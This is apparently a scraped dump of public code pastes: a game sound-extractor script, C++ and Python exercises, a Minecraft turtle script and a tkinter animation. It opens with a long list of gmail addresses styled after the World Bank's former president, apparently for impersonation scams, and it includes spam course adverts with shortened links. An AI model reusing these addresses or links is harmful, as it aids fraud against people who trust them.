<a href=""mailto:worldbankdaviidmalpass11+10095@gmail.com"">worldbankdaviidmalpass11+10095@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+27038@gmail.com"">worldbankdaviidmalpass11+27038@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+27160@gmail.com"">worldbankdaviidmalpass11+27160@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+24084@gmail.com"">worldbankdaviidmalpass11+24084@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+29761@gmail.com"">worldbankdaviidmalpass11+29761@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+30317@gmail.com"">worldbankdaviidmalpass11+30317@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+29503@gmail.com"">worldbankdaviidmalpass11+29503@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+31436@gmail.com"">worldbankdaviidmalpass11+31436@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+28459@gmail.com"">worldbankdaviidmalpass11+28459@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+11976@gmail.com"">worldbankdaviidmalpass11+11976@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+25373@gmail.com"">worldbankdaviidmalpass11+25373@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+25919@gmail.com"">worldbankdaviidmalpass11+25919@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+29995@gmail.com"">worldbankdaviidmalpass11+29995@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+21198@gmail.com"">worldbankdaviidmalpass11+21198@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+28932@gmail.com"">worldbankdaviidmalpass11+28932@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+1783@gmail.com"">worldbankdaviidmalpass11+1783@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+514@gmail.com"">worldbankdaviidmalpass11+514@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+19191@gmail.com"">worldbankdaviidmalpass11+19191@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+1291@gmail.com"">worldbankdaviidmalpass11+1291@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+26466@gmail.com"">worldbankdaviidmalpass11+26466@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+17051@gmail.com"">worldbankdaviidmalpass11+17051@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+20952@gmail.com"">worldbankdaviidmalpass11+20952@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+4440@gmail.com"">worldbankdaviidmalpass11+4440@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+27954@gmail.com"">worldbankdaviidmalpass11+27954@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+7645@gmail.com"">worldbankdaviidmalpass11+7645@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+21407@gmail.com"">worldbankdaviidmalpass11+21407@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+5336@gmail.com"">worldbankdaviidmalpass11+5336@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+5920@gmail.com"">worldbankdaviidmalpass11+5920@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+32385@gmail.com"">worldbankdaviidmalpass11+32385@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+19050@gmail.com"">worldbankdaviidmalpass11+19050@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+29399@gmail.com"">worldbankdaviidmalpass11+29399@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+5774@gmail.com"">worldbankdaviidmalpass11+5774@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+24231@gmail.com"">worldbankdaviidmalpass11+24231@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+3194@gmail.com"">worldbankdaviidmalpass11+3194@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+17896@gmail.com"">worldbankdaviidmalpass11+17896@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+22619@gmail.com"">worldbankdaviidmalpass11+22619@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+2640@gmail.com"">worldbankdaviidmalpass11+2640@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+32711@gmail.com"">worldbankdaviidmalpass11+32711@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+17527@gmail.com"">worldbankdaviidmalpass11+17527@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+29587@gmail.com"">worldbankdaviidmalpass11+29587@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+6343@gmail.com"">worldbankdaviidmalpass11+6343@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+3811@gmail.com"">worldbankdaviidmalpass11+3811@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+2618@gmail.com"">worldbankdaviidmalpass11+2618@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+12556@gmail.com"">worldbankdaviidmalpass11+12556@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+11572@gmail.com"">worldbankdaviidmalpass11+11572@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+14148@gmail.com"">worldbankdaviidmalpass11+14148@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+1991@gmail.com"">worldbankdaviidmalpass11+1991@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+21646@gmail.com"">worldbankdaviidmalpass11+21646@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+28930@gmail.com"">worldbankdaviidmalpass11+28930@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+11105@gmail.com"">worldbankdaviidmalpass11+11105@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+3228@gmail.com"">worldbankdaviidmalpass11+3228@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+2714@gmail.com"">worldbankdaviidmalpass11+2714@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+8372@gmail.com"">worldbankdaviidmalpass11+8372@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+15734@gmail.com"">worldbankdaviidmalpass11+15734@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+22212@gmail.com"">worldbankdaviidmalpass11+22212@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+31421@gmail.com"">worldbankdaviidmalpass11+31421@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+28079@gmail.com"">worldbankdaviidmalpass11+28079@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+30198@gmail.com"">worldbankdaviidmalpass11+30198@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+16817@gmail.com"">worldbankdaviidmalpass11+16817@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+5807@gmail.com"">worldbankdaviidmalpass11+5807@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+6413@gmail.com"">worldbankdaviidmalpass11+6413@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+15891@gmail.com"">worldbankdaviidmalpass11+15891@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+20841@gmail.com"">worldbankdaviidmalpass11+20841@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+15187@gmail.com"">worldbankdaviidmalpass11+15187@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+30278@gmail.com"">worldbankdaviidmalpass11+30278@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+13849@gmail.com"">worldbankdaviidmalpass11+13849@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+12415@gmail.com"">worldbankdaviidmalpass11+12415@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+24357@gmail.com"">worldbankdaviidmalpass11+24357@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+26837@gmail.com"">worldbankdaviidmalpass11+26837@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+7074@gmail.com"">worldbankdaviidmalpass11+7074@gmail.com</a>"
yr61LFAL,Detroit Sound Extractor,Nicknine,Python,Sunday 21st of January 2024 04:10:17 PM CDT,"import os
import struct
import io

# Parameters
idxFile=r""D:\Games\Steam\steamapps\common\Detroit Become Human\BigFile_PC.idx""
bnkDir=r""E:\GameRips\detroit\pc""
wemDir=r""E:\GameRips\detroit\pc\wem""

extractBnk=True
extractWem=False



# Script starts here
idx=dict()
datHandles=dict()
bigFileName=None

class FileEntry:
    def __init__(self,f):
        data=struct.unpack("">7I"",f.read(0x1c))
        self.typ=data[0]
        self.count=data[1]
        self.id=data[2]
        self.offset=data[3]
        self.size=data[4]
        self.extraSize=data[5]
        self.datNum=data[6]

def parseIdx(fname):
    name,ext=os.path.splitext(fname)
    global bigFileName
    bigFileName=name

    f=open(fname,""rb"")
    f.seek(0x65)
    numFiles=struct.unpack("">I"",f.read(0x04))[0]
    for i in range(numFiles):
        entry=FileEntry(f)
        idx[entry.typ,entry.id]=entry
    f.close()

def loadFile(ref):
    entry=idx[ref]
    if entry.datNum in datHandles:
        f=datHandles[entry.datNum]
    else:
        name,ext=os.path.splitext(bigFileName)
        newExt="".dat"" if entry.datNum==0 else "".d%02d"" % (entry.datNum)
        datName=name+newExt
        f=open(datName,""rb"")
        datHandles[entry.datNum]=f

    f.seek(entry.offset)
    data=f.read(entry.size)
    return data

def readHeader(f,expectedMagic=None):
    magic,ver=struct.unpack(""<8sI"",f.read(0x0c))
    if expectedMagic and magic!=expectedMagic:
        raise Exception(""Bad header magic at 0x%08x! Expected %s, got %s!"" %
                        (f.tell()-0x0c,expectedMagic,magic))

def readString(f):
    size=struct.unpack(""<I"",f.read(0x04))[0]
    return f.read(size).decode()

def readQZip(f):
    magic,flag=struct.unpack(""<4sB"",f.read(0x05))
    if magic!=b""QZIP"":
        raise Exception(""Bad QZIP magic at 0x%08x!"" % (f.tell()-0x05))

def readComCont(f,dc=False):
    readHeader(f,b""COM_CONT"")
    size,numRefs=struct.unpack(""<II"",f.read(0x08))
    refs=list()
    for i in range(numRefs):
        typ,id,flag=struct.unpack(""<IIB"",f.read(0x09))
        refs.append((typ,id))

    # Legacy thing from Fahrenheit and early Heavy Rain, always empty.
    readHeader(f,b""LOADCONT"")
    if not dc:
        size=struct.unpack(""<I"",f.read(0x04))[0]
        f.seek(size,1)

    return refs

def closeDats():
    for f in datHandles.values():
        f.close()
    datHandles.clear()

def extractSoundBanks(outpath):
    print(""Extracting BNK..."")
    os.makedirs(outpath,exist_ok=True)

    for ref in idx:
        if ref[0]!=1022:
            continue

        #print(""%s: %s"" % (ref[0],ref[1]))
        f=io.BytesIO(loadFile(ref))

        comRefs=readComCont(f)
        readHeader(f,b""CSNDBNK_"")
        size=struct.unpack(""<I"",f.read(0x04))[0]
        bnkId=readString(f)
        bnkName=readString(f)
        print(""%s: %s"" % (bnkId,bnkName))

        f2=io.BytesIO(loadFile(comRefs[0]))

        # HACK: There's no offsets table for assets inside Data Container
        # so we just look for CSNDBKDT string.
        pos=f2.getvalue().find(b""CSNDBKDT"")
        if pos==-1:
            print(""No BNK data for %s!"" % (bnkName))
            continue

        f2.seek(pos)
        readHeader(f2)
        size=struct.unpack(""<I"",f2.read(0x04))[0]
        bnkData=f2.read(size)
        out=open(os.path.join(outpath,bnkName+"".bnk""),""wb"")
        out.write(bnkData)
        out.close()

    closeDats()

def extractSoundData(outpath):
    print(""Extracting WEM..."")
    os.makedirs(outpath,exist_ok=True)

    for ref in idx:
        if ref[0]!=1033:
            continue

        f=io.BytesIO(loadFile(ref))
        readQZip(f)
        readHeader(f,b""CSNDDATA"")
        size=struct.unpack(""<I"",f.read(0x04))[0]
        unkStr=readString(f)
        unkNum=struct.unpack(""<I"",f.read(0x04))[0]
        wemName=readString(f)
        wemSize=struct.unpack(""<I"",f.read(0x04))[0]
        wemData=f.read(wemSize)
        #print(wemName)
        out=open(os.path.join(outpath,wemName+"".wem""),""wb"")
        out.write(wemData)
        out.close()

    closeDats()

if __name__==""__main__"":
    parseIdx(idxFile)

    if extractBnk:
        extractSoundBanks(bnkDir)

    if extractWem:
        extractSoundData(wemDir)
"
QpURumhs,08. Even Times,Spocoman,C++,Sunday 21st of January 2024 03:36:08 PM CDT,"#include <iostream>
#include <string>
#include <map>

using namespace std;

int main() {
    int n, number;
    cin >> n;

    map<int, int> numbers;

    for (int i = 0; i < n; i++) {
        cin >> number;
        numbers[number]++;
    }

    for(auto& n:numbers) {
        if (n.second % 2 == 0) {
            cout << n.first << endl;
            break;
        }
    }
    return 0;
}"
0ZP8DXvv,prime_number_checker,Osiris1002,Python,Sunday 21st of January 2024 03:31:30 PM CDT,"num = int(input())
if num > 1:
    for i in range(2, num):
        if (num % i) == 0:
            print(""False"")
            break
    else:
        print(""True"")
else:
    print(""False"")"
AaCXvdL8,winterfall,rosswolf,HTML,Sunday 21st of January 2024 03:24:36 PM CDT,"<center><link href=""https://dl.dropbox.com/scl/fi/ud8da49r3kjeuqyr9x1bq/winterfall.css?rlkey=mljrzul86mvjvuf8bnyd5o7bh&dl=0"" rel=""stylesheet""><div id=""rr_winterfall"" style=""--width: 200px; --img-height: 115px; --icon-size: 55px; --bg-main: #efefe6; --text-color: #000;""><a href=""https://is.gd/rossr"" title=""「by ross」""></a><div class=""rcontainer""><div class=""rimg"" style=""background-image: url(https://64.media.tumblr.com/fcd37921847e40e1660f23bc1b067144/303db05f23593479-c3/s400x600/57025dabaaab04d313e6e4a1f648bfffb58ee2c8.pnj);""></div><div class=""rfooter""><span>WINTERFALL</span><img src=""https://64.media.tumblr.com/935b00bf6a4b94bc78b697de75914fcc/303db05f23593479-a2/s400x600/1369b1fd71163119f08d0d75ef9bc69d8d671d11.pnj"" /></div></div></div></center>"
UEZzCUgi,07. Sets of Elements,Spocoman,C++,Sunday 21st of January 2024 03:22:41 PM CDT,"#include <iostream>
#include <string>
#include <set>
#include <vector>
#include <algorithm>

using namespace std;

int main() {
    int n, m, number;
    cin >> n >> m;

    set<int> numbers1;
    set<int> numbers2;

    for (int i = 0; i < n + m; i++) {
        cin >> number;
        i < n ? numbers1.insert(number) : numbers2.insert(number);
    }

    vector<int> numbers3;
    set_intersection(numbers1.begin(), numbers1.end(), numbers2.begin(), numbers2.end(), back_inserter(numbers3));

    for (auto& n : numbers3) {
        cout << n << ' ';
    }

    cout << endl;
    return 0;
}"
B1FVVfD3,06. Unique Usernames,Spocoman,C++,Sunday 21st of January 2024 02:59:02 PM CDT,"#include <iostream>
#include <string>
#include <set>

using namespace std;

int main() {
    int n;
    cin >> n;

    string name;

    set<string> names;

    for (int i = 0; i < n; i++) {
        cin >> name;
        names.insert(name);
    }

    for (auto& n : names) {
        cout << n << endl;
    }

    return 0;
}"
sdLTu63A,05. Parking Lot,Spocoman,C++,Sunday 21st of January 2024 02:54:12 PM CDT,"#include <iostream>
#include <string>
#include <set>

using namespace std;

int main() {
    string line, command, numberPlate;
    getline(cin, line);

    set<string> numberPlates;

    while (line != ""END"") {
        command = line.substr(0, line.find(','));
        numberPlate = line.substr(line.find(',') + 2);

        numberPlates.insert(numberPlate);

        if (command == ""OUT"") {
            numberPlates.erase(numberPlate);
        }
      
        getline(cin, line);
    }

    if (numberPlates.empty()) {
        cout << ""Parking Lot is Empty\n"";
    }
    for (auto& n : numberPlates) {
        cout << n << endl;
    }

    return 0;
}"
9TSpqQ6H,Untitled,sissou123,C,Sunday 21st of January 2024 02:34:59 PM CDT,"Advanced C Programming Course
Become a True Master of the C Programming Language - Confidently Apply for Real Time or Embedded C Jobs or contracts! 
This course is designed to take your basic C skills to the next level and help you obtain mastery of the language by helping you understand advanced concepts of the C programming language 
for more:https://cuty.io/JjiRIiFGU
"
neNU65Pk,Untitled,iliqiliev,Python,Sunday 21st of January 2024 02:31:20 PM CDT,"class Node:
    def __init__(self, data: int) -> None:
        self.data = data
        self.next: None | Node = None


class LinkedList:
    def __init__(self) -> None:
        self.head = None

    def append(self, data: int) -> None:
        if self.head:
            current_node = self.head
            while current_node.next:
                current_node = current_node.next
            current_node.next = Node(data)

        else:
            self.head = Node(data)

    def avail(self, avail):
        current_node = self.head
        counter = 1
        last_node = self.head

        while current_node:
            if not counter % 2 and current_node.data >= (counter * 3):
                avail.append(current_node.data)
                last_node.next = current_node.next

            else:
                last_node = current_node

            current_node = current_node.next
            counter += 1

    def print_ll(self) -> None:
        current_node = self.head

        while current_node:
            print(current_node.data, end="" "")
            current_node = current_node.next


main_list = LinkedList()
for index in range(10):
    main_list.append(1 + index)

avail_list = []

main_list.avail(avail_list)
print(main_list.print_ll())
print(""Avail list"", avail_list)
"
XKwMZgZb,04. Record Unique Names,Spocoman,C++,Sunday 21st of January 2024 02:27:59 PM CDT,"#include <iostream>
#include <string>
#include <vector>

using namespace std;

bool isfound(vector<string> v, string s) {
    for (size_t i = 0; i < v.size(); i++) {
        if (v[i] == s) {
            return true;
        }
    }
    return false;
}

int main() {
    int n;
    cin >> n;

    vector<string> names;

    string name;

    for (int i = 0; i < n; i++) {
        cin >> name;
        if (!isfound(names, name)) {
            names.push_back(name);
        }
    }

    for (auto& name : names) {
        cout << name << endl;
    }

    return 0;
}"
1KqZ9JLu,Untitled,sissou123,C,Sunday 21st of January 2024 02:23:58 PM CDT,"C Programming Bootcamp - The Complete C Language Course
C Programming 2023: Master the Fundamentals of C Programming Language. Join the Comprehensive C Bootcamp Masterclass! 
Fundamentals of Programming
Summarised & Concise Material [Saving TONS of Time!]
OVER 100 Practical Exercises!
Animated Explanation & Illustrations - Explaining ""Hard Topics"" EASY 
for more:https://cuty.io/QfY90
"
1PazYnuU,My IBAN,AhmedElazazy,Python,Sunday 21st of January 2024 02:23:14 PM CDT,"4C4C4544-0048-5010-8033-C4C04F303832
7E5CE8A3-3D94-7911-3216-5A51CD95C5A1"
Vx8j98BQ,Untitled,Nenogzar,Python,Sunday 21st of January 2024 02:18:17 PM CDT,"text = input().lower()
words = [""sand"", ""water"", ""fish"", ""sun""]
print(sum([text.count(word) for word in words]))"
2smsCCu1,Untitled,sissou123,PHP,Sunday 21st of January 2024 02:13:02 PM CDT,"PHP for Beginners: How to Build an Ecommerce Store
PHP Ecommerce: in this course you will learn how to make full Ecommerce websites to build your own home business 
After creating a very successful PHP for beginners course, I'm back with another Amazing course that will take your basic PHP skills to another level. 
for more:https://cuty.io/bhzys2
"
0x1v9fYN,Temp,kobalium23,Lua,Sunday 21st of January 2024 02:12:24 PM CDT,"height = 63
lenght = 0
maxheight = 80

while lenght < 150 do
    while height < maxheight do
        turtle.dig()
        turtle.up()
        height = height+1
    end
    turtle.forward()
    lenght = lenght + 1
    while height >63 do
        turtle.dig()
        turtle.down()
        height = height-1
    end
    turtle.forward()
    lenght = lenght + 1
end


"
BEAA40VL,Untitled,Tkap1,C++,Sunday 21st of January 2024 01:42:32 PM CDT,"

#include <stdio.h>

int main(int argc, char** argv)
{
	int count;
	scanf(""%d"", &count);
	for(int i = 0; i < count; i++) {
		int balls;
		scanf(""%d"", &balls);

		int size = 1;
		int steps = 0;
		while(balls >= size) {
			balls -= size;
			size += steps + 2;
			steps += 1;
		}
 		printf(""%i\n"", steps);
	}
	return 0;
}
"
da4ZdEhT,# tk_500x500_rgb_cosmic_explosion.py,here2share,Python,Sunday 21st of January 2024 01:31:06 PM CDT,"# tk_500x500_rgb_cosmic_explosion.py

import tkinter as tk
import random
from PIL import Image, ImageTk, ImageFilter, ImageDraw

ww = 500
hh = 500
cx = ww // 2
cy = ww // 2
p = 60

root = tk.Tk()
root.title(""# tk_500x500_rgb_cosmic_explosion.py"")
root.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

canvas = tk.Canvas(root, width=ww, height=hh)
canvas.pack()

colors = []
t = [z for z in range(0, 256, 15)]
for r in t:
	for g in t:
		for b in t:
			colors += [(r, g, b, 255)]
Lc = len(colors)

def crop_center(img):
    w, h = img.size
    target_w, target_h = ww + 2, hh + 2
    left = (w - target_w) // 2
    top = (h - target_h) // 2
    right = left + target_w
    bottom = top + target_h
    return img.crop((left, top, right, bottom))

alpha = 255 / 40
def zoom():
	global image_a, image_b
	for i in range(1, 51):
		image_a = crop_center(image_a)
		image_a = image_a.resize((ww+p, hh+p), Image.BICUBIC)
		image_a = image_a.filter(ImageFilter.GaussianBlur(1.0))
		image_a = image_a.point(lambda x: x // 15 * 15)
		plot(image_a)

	image_a, image_b = image_b, generate_new_image()

def generate_new_image():
	global idx
	size = 8
	buffer = 0
	for blur in (400, 400, 400, 400):
		img = Image.new(""RGBA"", (size, size))
		pixels = img.load()
		for y in range(size):
			for x in range(size):
				color = colors.pop(idx**3)
				idx = (idx + 1) % 16
				pixels[x, y] = color
				colors.append(color)
		img = img.resize((ww+p, hh+p))
		size *= 2
	return img

def plot(buffer):
	rgb_image = buffer.convert('RGB')
	photo = ImageTk.PhotoImage(rgb_image)
	canvas.create_image(cx, cy, anchor=tk.CENTER, image=photo)
	canvas.image = photo
	canvas.update()
	
t=50
mask = Image.new('L', (ww+p, hh+p), 0)
draw = ImageDraw.Draw(mask)
for i in range(0, min(ww+p, hh+p) // 2, 10):
	draw.rectangle([i, i, ww+p - i, hh+p - i], fill=i*255//((min(ww+p, hh+p) // 2)+1))
mask_size = (ww+p, hh+p)

idx = 0
image_a, image_b = [generate_new_image() for i in '..']

while True:
	zoom()
	idx += 1"
